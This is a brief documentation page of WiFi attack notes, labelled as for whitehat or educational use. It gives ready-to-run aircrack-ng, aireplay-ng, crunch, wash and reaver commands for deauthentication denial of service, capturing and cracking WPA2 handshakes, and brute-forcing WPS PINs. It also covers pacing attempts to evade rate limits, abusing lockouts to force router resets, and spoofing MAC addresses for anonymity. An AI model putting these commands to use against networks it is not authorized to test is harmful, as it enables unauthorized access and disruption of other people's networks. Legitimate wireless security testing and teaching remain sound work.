---
title: WiFi
type: docs
---

**These notes are intended for Whitehat/Educational purposes only**  


## Configure Machine  
Use `ifconfig` to determine device name (assume wlan0 for cmds)  
`ifconfig wlan0 down` - take device down  
`iwconfig wlan0 mode monitor` - set monitor mode  
`ifconfig wlan0 up` - bring device back up

`airmon-ng check wlan0` - Make sure nothing is interfering with your device  
Kill processes (kill network manager first)  

## Useful Commands  
Remember to change your mac address (notes on [this page](./staying-anonymous.md)).  
`airodump-ng wlan0` - Show wireless access points and connected devices  
`airodump-ng -c CHANNEL --bssid MAC -w FILENAME DEVICE` - lookat traffic on a specific device  
`aireplay-ng -0 0 -a MAC DEVICE` - DOS attack a wireless network  

### To crack WPA2  
Force user(s) to disconnect using a DOS attack, then watch them recconect and capture the handshake.  
`aircrack-ng -w WORDFILE CAPFILE -e ESSID` - Try to crack capture file with word list  
`crunch MINLEN MAXLEN -t PATTERN | aircrack-ng -w -CAPFILE -e ESSID` - Try to crack with pipe from crunch (this operation is happening locally against the file not live against the router)  
 
### To crack WPS
Use `wash -i DEVICE` to view available routers to attack without wps locked.  
Use `airodump-ng` to confirm you have good enough range.  
Use `reaver` to orchestrate your attack.  
WPS uses either a 4 or 8 digit pin of consisting of only numbers, you should disable it on your router (usually enabled by default).  
Many routers will disable pin access for some period of time after too many failed attempts (ratelimiting), you can adjust `reaver` to try less often to avoid tripping this failsafe.  
That same falesafe makes it easy to perform DOS on networks that rely on WPS authentication. If the ratelimiting locks you out completely, you can DOS it hard enough to try and force a the administrator to reset their router.  

### DOS Attacks  
Basically impossible to stop.  
May need to set the channel of your wifi card `iwconfig DEVICE channel CHANNEL`  
Then use `aireplay-ng -0 0 -a MAC DEVICE`, to DOS all connected machines.  
